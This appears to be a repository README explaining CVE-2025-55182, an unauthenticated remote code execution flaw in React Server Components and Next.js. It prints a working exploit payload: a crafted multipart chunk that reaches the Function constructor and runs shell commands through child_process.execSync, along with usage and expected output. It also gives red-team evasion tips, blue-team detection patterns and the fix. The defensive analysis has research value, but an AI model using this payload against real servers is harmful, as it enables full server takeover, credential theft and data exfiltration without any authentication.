# https://github.com/msanft/CVE-2025-55182/tree/main/test-server



# 🧨 **CVE-2025-55182 – React Server Components Unauthenticated RCE**

### Technical Explanation & Python PoC Walkthrough

*(For research & security testing only)*

---

# 📌 Overview

**CVE-2025-55182** is a **critical Remote Code Execution vulnerability (CVSS 10.0)** affecting:

* **React 19.x**
* **React Server Components (RSC)**
* Frameworks implementing RSC such as **Next.js (13.x–15.x)**

The issue arises because the **React Flight Protocol** — the serialization format used to transfer values between client and server — allowed an attacker to supply **arbitrary object paths** via specially crafted multipart form chunks.

React failed to ensure that referenced properties actually belonged to the object (i.e., missing `hasOwnProperty` checks), allowing an attacker to escalate to:

### ➤ **Prototype pollution**

### ➤ **Access to `Function` constructor**

### ➤ **Execution of attacker-supplied JavaScript code**

### ➤ **RCE inside the Node.js process hosting RSC**

Even worse:

**The exploit triggers before any routing or action validation in Next.js — meaning authentication does not apply.**

---

# 🔍 Why This Vulnerability Exists

React Server Components accept **multipart/form-data** payloads containing serialized “chunks” representing values to be hydrated or passed to server functions.

Example (normal behavior):

```json
files = {
  "0": ["$1"],
  "1": {"fruit": "cherry"}
}
```

React recursively resolves references like `"$1:fruit"`.

### ⚠️ But React did *not* restrict what properties could be referenced.

This allowed exploit chains such as:

```
$1:__proto__:constructor:constructor
```

→ which resolves to:

```
Function
```

Meaning the attacker can now dynamically build executable JavaScript inside the server.

Once we can obtain the `Function` constructor, we have arbitrary code execution.

---

# 🚀 Exploit Strategy: High-Level

1. **Upload multipart chunks** with structure React expects
2. **Use `$@0` trick** to retrieve the raw representation of a chunk
3. **Overwrite the `.then` property** to influence how promises resolve
4. **Force `Chunk.prototype.then` to run** with malicious input
5. **Set `status = "resolved_model"`** so the chunk is parsed as a full RSC model
6. **Inject a `$B` blob reference** to reach a code execution gadget
7. **Craft the `_response` metadata** so `_response._prefix + index` becomes JavaScript code
8. **Have `_formData.get` point to the `Function` constructor**
9. **Return a thenable** → automatically executed by Next.js during `await`

This sequence yields:

```
Function("<attacker’s code>")()
```

Which is Remote Code Execution.

---

# 🧪 The Python PoC (Exploit Trigger)

Below is the PoC we originally built and later refactored.
This is the **core exploit payload**:

```python
crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": (
            f"var res = process.mainModule.require('child_process')"
            f".execSync('{EXECUTABLE}',{{'timeout':5000}})"
            f".toString().trim();"
            f"throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});"
        ),
        "_formData": {
            "get": "$1:constructor:constructor"
        }
    }
}
```

### What this payload does:

| Field                           | Exploit Purpose                                       |
| ------------------------------- | ----------------------------------------------------- |
| `"then": "$1:__proto__:then"`   | Hijacks thenable resolution chain                     |
| `"status": "resolved_model"`    | Forces React to JSON-parse this chunk                 |
| `"value": "{\"then\":\"$B0\"}"` | `$B` triggers blob gadget → injected code             |
| `"_formData.get"`               | Points to `Function` constructor                      |
| `"_prefix"`                     | Contains attacker-controlled JavaScript code          |
| `"$@0"`                         | Returns the raw underlying chunk for self-referencing |

The multipart payload is:

```python
files = {
    "0": (None, json.dumps(crafted_chunk)),
    "1": (None, '"$@0"'),
}
```

Everything here is specifically designed to:

### 🔥 Force React to evaluate attacker-supplied JavaScript inside Node

### 🔥 Extract the result via error digest

### 🔥 Avoid all Next.js action validation and authentication

---

# 🏗️ How the RCE Actually Fires

React internally uses:

```js
await decodeReplyFromBusboy(...)
```

If the object returned is a “thenable”, V8 automatically invokes:

```js
then(resolve, reject)
```

By replacing `.then` with our own malicious chain, we cause:

1. **Second-pass RSC revival**
2. **Blob referencing leading to gadget execution**
3. **`Function(prefix + index)` call**
4. **Execution of:**

```js
process.mainModule.require("child_process").execSync("<command>")
```

5. **Digest-based exfiltration** (cleaner than printing to stdout)

---

# 🔐 Why Auth Doesn’t Matter

Next.js normally protects server actions by checking the `Next-Action` header *after* parsing the request.

But the vulnerability occurs **during deserialization**, before the framework knows what endpoint or action is being targeted.

Thus:

### ❌ No CSRF token

### ❌ No session

### ❌ No user identity

### ❌ No server action

### ❌ No API route

### ❌ No permissions

Just a raw POST with `multipart/form-data`.

---

# ✔️ Python PoC Summary

### 1. Build exploit chunk

### 2. Send multipart POST

### 3. Trigger RSC deserialization

### 4. Reach prototype pollution path

### 5. Obtain `Function` constructor

### 6. Build & execute arbitrary JS

### 7. Execute arbitrary OS commands

### 8. Return command output straight in Next.js `digest` field

---

# 🧰 Usage Example

```
python3 poc.py http://localhost:3000 whoami
```

Expected output:

```
500
Error: NEXT_REDIRECT
digest: <command output>
```

Example:

```
digest: node
```

##
##

# 🔥 **CVE-2025-55182 – Technical Deep Dive, PoC Explanation, Blue-Team vs Red-Team, Diagrams & Academic Writeup**

*(This section extends the existing README you already have.)*

---

## 📌 Academic-Style Background Summary

**CVE-2025-55182** is a critical deserialization vulnerability in the **React Flight Protocol**, used by React Server Components (RSC) and frameworks built on top of it (Next.js 13–16). The issue arises because React's deserializer failed to check whether keys referenced via `$<id>:<path>` actually belong to the target object. This allowed attackers to traverse:

```
__proto__.constructor.constructor
```

Which resolves to JavaScript’s global **Function** constructor — effectively enabling the execution of arbitrary code.

The vulnerability occurs **before** any route logic, authentication, or server action validation. In Next.js this means:

* The exploit hits **before action ID verification**
* It executes during **multipart data ingestion**
* It occurs **inside the server component deserializer**, not in user routes

Because of this, the vulnerability is **unauthenticated RCE**, reliably accessible via a single HTTP POST containing multipart data.

---

# 🔬 **High-Level Vulnerability Structure (ASCII Architecture Diagram)**

```
          ┌────────────────────────────────────────┐
          │        Attacker (No Auth Required)     │
          └───────────────┬────────────────────────┘
                          POST multipart/form-data
                                  |
                                  v
      ┌────────────────────────────────────────────────────────┐
      │  Next.js / React RSC Flight Deserializer (Vulnerable)  │
      │--------------------------------------------------------│
      │  1. Accepts chunk "0" as JSON                          │
      │  2. Accepts chunk "1" as "$@0" → raw pointer           │
      │  3. Applies "$1:__proto__:then" → prototype pollution  │
      │  4. Treats chunk0 as a Promise-like "thenable"         │
      │  5. Auto-invokes chunk.then(...) during `await`        │
      └───────────────┬────────────────────────────────────────┘
                      v
        ┌──────────────────────────────────────────────┐
        │ initializeModelChunk()                        │
        │ - Because status="resolved_model"             │
        │ - Parses chunk.value as JSON again            │
        │ - Hits Blob Gadget ($B)                       │
        │   → calls response._formData.get()            │
        └───────────────┬──────────────────────────────┘
                        v
           ┌──────────────────────────────────────────┐
           │ response._formData.get = Function        │
           │ response._prefix = attacker JS code      │
           └───────────────────┬──────────────────────┘
                               v
                ┌────────────────────────────────┐
                │ Function("<attacker code>")() │
                └────────────────────────────────┘
                               |
                               v
                  🧨 **Arbitrary Remote Code Execution**
```

---

# ⚔️ **Red-Team (Attacker) Perspective**

### 🎯 **Primary Goals**

* Achieve **unauthenticated RCE**
* Bypass all server action / auth layers
* Maintain high reliability across:

  * Next.js 13.4–16.0.6
  * Node.js 16–22
  * Vercel / standalone deployments
  * Docker containers

### 🟥 Key Attacker Techniques

#### **1. Prototype Pollution via `$1:__proto__:then`**

Steals the internal `Chunk.prototype.then`, enabling control of the deserialization flow.

#### **2. Using `$@0` to obtain raw chunk references**

`"$@0"` is *not model resolved*, giving a raw pointer to chunk 0 itself.

This allows:

* Self-referencing payloads
* Passing attacker-controlled `chunk._response` into initialization functions
* Creating circular structures React never expected

#### **3. Forcing "resolved_model" to trigger second parse**

This is where attacker-controlled JSON is parsed again, giving access to the blob gadget.

#### **4. Blob Gadget → RCE**

When hitting `$B1337`, React calls:

```
response._formData.get(response._prefix + "1337")
```

If `.get = Function`, the attacker obtains:

```
Function("process.mainModule.require('child_process').execSync('id')")()
```

→ RCE.

#### **5. Evasion & stealth**

Red team may:

* Use `throw` with digest to return output cleanly
* Encode payload to avoid logging patterns
* Trigger blind commands with delays (ping, sleep)

---

# 🛡️ **Blue-Team Detection & Defense**

### 🟦 **1. Network Detection**

Indicators of malicious multipart payloads:

* Multipart requests with **fields named “0” and “1”**
* Payload containing:

  * `$1:__proto__:then`
  * `$@0`
  * `$B` + digits
  * `"status":"resolved_model"`

Sample detection logic:

```
If POST multipart/form-data AND
    body contains "$@0" AND
    body contains "__proto__"
Then alert: React RSC exploitation attempt
```

### 🟦 **2. Application Log Detection**

Before patching, successful exploitation may create logs including:

* Errors containing `NEXT_REDIRECT digest:`
* `Function` appearing in deserialization traces
* Unexpected JavaScript exceptions during `decodeReplyFromBusboy`

### 🟦 **3. Runtime Detection**

Node.js behavior to alert on:

* Unexpected `child_process.execSync` execution
* Calls to `process.mainModule.require`
* Creation of new `Function()` at runtime

*(Note: Detecting dynamic Function usage is a very strong signal.)*

### 🟦 **4. Defensive Hardening**

* Patch React to ≥ versions containing the fix:

  * Add `hasOwnProperty` checks
  * Reject references into prototype
* Do not allow server actions to process arbitrary form-data
* Enforce strict MIME types
* Disable or isolate RSC server function nodes
* Apply runtime sandboxing (VM, seccomp, gVisor, firejail for labs)

---

# 🧵 **Academic Writeup Section**

### **Abstract**

CVE-2025-55182 is a critical Remote Code Execution vulnerability in React Server Components caused by unsafe reference deserialization within the React Flight Protocol. By exploiting prototype pollution and unsafe method resolution, an attacker can cause React to deserialize user-controlled multipart data into execution paths that trigger invocation of the JavaScript Function constructor. The vulnerability leads to arbitrary code execution in the Node.js environment and affects major production frameworks such as Next.js 13–16.

### **Threat Model**

* Attacker is remote, unauthenticated
* Target is a Next.js (or React RSC) application
* Attacker sends a handcrafted multipart/form-data POST request
* No prior authentication or interaction is required
* Firewall, WAF, and reverse proxies typically do not inspect React Flight protocol structures

### **Root Cause Analysis**

* React Flight allowed **unchecked property traversal**
* Deserialization combined:

  1. `$@` raw chunk retrieval
  2. prototype traversal (`__proto__`)
  3. implicit thenable invocation
  4. multiple JSON parse passes
  5. Blob deserialization calling attacker-controlled getters

This combination produced a multi-stage exploitation chain culminating in RCE.

### **Impact**

* Full compromise of application server
* Credential theft
* Lateral movement
* Supply chain compromise (CI/CD runners using Next.js builds)
* Persistent backdoors
* Data exfiltration

### **Fix Analysis**

React patched the vulnerability by adding:

```js
if (hasOwnProperty.call(moduleExports, metadata[NAME])) {
  return moduleExports[metadata[NAME]];
}
return undefined;
```

This prevents:

* traversing into prototype
* accessing constructor constructor
* obtaining Function

Thus eliminating the fundamental gadget enabling code execution.

---

##
##
